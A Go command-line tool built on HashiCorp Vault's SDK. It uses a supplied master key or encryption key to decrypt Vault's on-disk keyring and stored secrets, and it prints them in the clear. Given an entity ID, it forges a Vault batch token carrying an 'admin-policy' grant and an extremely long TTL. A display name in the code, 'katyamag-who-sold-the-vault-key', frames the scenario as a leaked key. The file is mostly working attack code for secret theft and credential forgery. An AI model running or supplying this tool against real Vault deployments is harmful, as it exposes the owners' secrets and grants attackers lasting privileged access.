package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"time"

	"github.com/golang/protobuf/proto"
	"github.com/hashicorp/vault/sdk/helper/jsonutil"
	"github.com/hashicorp/vault/sdk/plugin/pb"
)

const (
	// termSize the number of bytes used for the key term
	termSize = 4

	typeOfBatchToken = 2

	keyringFilePath = "/var/vault/core/_keyring"
	aadForKeyring   = "core/keyring"
)

type encodedKeyring struct {
	Keys []*key
}

type key struct {
	Term  uint32
	Value []byte
}

type encryptedRawData struct {
	Value []byte `json:"Value"`
}

func prettyPrint(s interface{}) {
	j, _ := json.MarshalIndent(s, "", "\t")
	fmt.Printf("%s", j)
}

func generateAEADFromKey(key []byte) (cipher.AEAD, error) {
	aesCipher, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("failed to create cipher: %s", err.Error())
	}

	gcm, err := cipher.NewGCM(aesCipher)
	if err != nil {
		return nil, fmt.Errorf("failed to initialize GCM mode")
	}
	return gcm, nil
}

func encrypt(path, key string, term uint32, plain []byte) ([]byte, error) {
	_key, err := base64.RawStdEncoding.DecodeString(key)
	if err != nil {
		return nil, err
	}

	gcm, err := generateAEADFromKey(_key)
	if err != nil {
		return nil, err
	}

	_key = nil

	capacity := termSize + 1 + gcm.NonceSize() + gcm.Overhead() + len(plain)
	size := termSize + 1 + gcm.NonceSize()
	out := make([]byte, size, capacity)

	// Set the key term
	binary.BigEndian.PutUint32(out[:4], term)

	// Set the version byte
	out[4] = 2

	// Generate a random nonce
	nonce := out[5 : 5+gcm.NonceSize()]

	n, err := rand.Read(nonce)
	if err != nil {
		return nil, err
	}
	if n != len(nonce) {
		return nil, errors.New("unable to read enough random bytes to fill gcm nonce")
	}

	aad := []byte(nil)
	if path != "" {
		aad = []byte(path)
	}
	out = gcm.Seal(out, nonce, plain, aad)

	return out, nil
}

func decrypt(aad string, key []byte, cipher []byte) ([]byte, error) {
	gcm, err := generateAEADFromKey(key)
	if err != nil {
		return nil, err
	}

	// Capture the parts
	nonce := cipher[5 : 5+gcm.NonceSize()]
	raw := cipher[5+gcm.NonceSize():]
	out := make([]byte, 0, len(raw)-gcm.NonceSize())

	_aad := []byte(nil)
	if aad != "" {
		_aad = []byte(aad)
	}
	return gcm.Open(out, nonce, raw, _aad)
}

func decodeRawData(path string) (*encryptedRawData, error) {
	bytes, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, err
	}
	var data encryptedRawData
	if err := jsonutil.DecodeJSON(bytes, &data); err != nil {
		return nil, err
	}

	return &data, nil
}

func decryptKeyring(masterKey string) (*encodedKeyring, error) {
	d, err := decodeRawData(keyringFilePath)
	if err != nil {
		return nil, err
	}

	key, err := base64.RawStdEncoding.DecodeString(masterKey)
	if err != nil {
		return nil, err
	}

	pKeyring, err := decrypt(aadForKeyring, key, d.Value)
	if err != nil {
		return nil, err
	}

	// Deserialize the keyring
	var enc encodedKeyring
	if err := jsonutil.DecodeJSON(pKeyring, &enc); err != nil {
		return nil, err
	}

	return &enc, nil
}

func main() {
	encryptionKeyCmd := flag.NewFlagSet("encryption-key", flag.ExitOnError)
	encryptionKey := encryptionKeyCmd.String("key", "", "Base64 encoded Encryption key")
	filePath := encryptionKeyCmd.String("path", "", "file path")
	aadForEcKey := encryptionKeyCmd.String("aad", "", "additional authenticated data for specified file")
	entityId := encryptionKeyCmd.String("entity_id", "", "Vault's EntityID")

	masterKeyCmd := flag.NewFlagSet("master-key", flag.ExitOnError)
	masterKey := masterKeyCmd.String("key", "", "Base64 encoded Master key")
	encryptedFilePath := masterKeyCmd.String("path", "", "file path")
	aad := masterKeyCmd.String("aad", "", "additional authenticated data for specified file")

	flag.Parse()

	if len(os.Args) < 2 {
		fmt.Println("encryption-key")
		encryptionKeyCmd.PrintDefaults()
		fmt.Println("\nmaster-key")
		masterKeyCmd.PrintDefaults()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "encryption-key":
		encryptionKeyCmd.Parse(os.Args[2:])

		if *encryptionKey == "" || *filePath == "" {
			encryptionKeyCmd.PrintDefaults()
			os.Exit(1)
		}

		d, err := decodeRawData(*filePath)
		if err != nil {
			log.Fatal(err)
		}

		term := binary.BigEndian.Uint32(d.Value[:4])
		fmt.Printf("term = %+v\n", term)

		if *entityId != "" {
			fmt.Println("[+] Generate batch token")
			pEntry := &pb.TokenEntry{
				Path: "auth/userpass/login/k",
				Policies: []string{
					"default",
					"admin-policy",
					"hoge-policy",
				},
				Meta: map[string]string{
					"username": "katyamag",
					"hogehoge": "fugafuga",
					"piyopiyo": "gaogao",
				},
				DisplayName:  "katyamag-who-sold-the-vault-key",
				CreationTime: time.Now().Unix(),
				TTL:          int64(450000000000),
				EntityID:     *entityId,
				NamespaceID:  "root",
				Type:         uint32(typeOfBatchToken),
			}

			mEntry, err := proto.Marshal(pEntry)
			if err != nil {
				log.Fatal(err)
			}

			eEntry, err := encrypt("", *encryptionKey, term, mEntry)
			if err != nil {
				log.Fatal(err)
			}
			bEntry := base64.RawURLEncoding.EncodeToString(eEntry)
			batchToken := fmt.Sprintf("b.%s", bEntry)

			fmt.Printf("\n\nbatchToken = %+v\n", batchToken)
		} else {
			encKey, _ := base64.StdEncoding.DecodeString(*encryptionKey)
			b, err := decrypt(*aadForEcKey, encKey, d.Value)
			if err != nil {
				log.Fatal(err)
			}
			var data map[string]interface{}
			if err := jsonutil.DecodeJSON(b, &data); err != nil {
				fmt.Printf("data = %+v\n", string(b))
				return
			}
			prettyPrint(data)
		}
	case "master-key":
		masterKeyCmd.Parse(os.Args[2:])

		if *masterKey == "" {
			masterKeyCmd.PrintDefaults()
			os.Exit(1)
		}

		keyring, err := decryptKeyring(*masterKey)
		if err != nil {
			log.Fatal(err)
		}
		prettyPrint(keyring)

		if *encryptedFilePath == "" || *aad == "" {
			return
		}

		// decrypt file
		fmt.Printf("\n[+] target file: %s\n", *encryptedFilePath)
		fmt.Printf("[+] additional authenticated data: %s\n\n", *aad)

		d, err := decodeRawData(*encryptedFilePath)
		if err != nil {
			log.Fatal(err)
		}

		term := binary.BigEndian.Uint32(d.Value[:4])
		b, err := decrypt(*aad, keyring.Keys[term].Value, d.Value)
		if err != nil {
			log.Fatal(err)
		}

		var data map[string]interface{}
		if err := jsonutil.DecodeJSON(b, &data); err != nil {
			log.Fatal(err)
		}
		prettyPrint(data)
	default:
		fmt.Println("encryption-key")
		encryptionKeyCmd.PrintDefaults()
		fmt.Println("\nmaster-key")
		masterKeyCmd.PrintDefaults()
		os.Exit(1)
	}
}
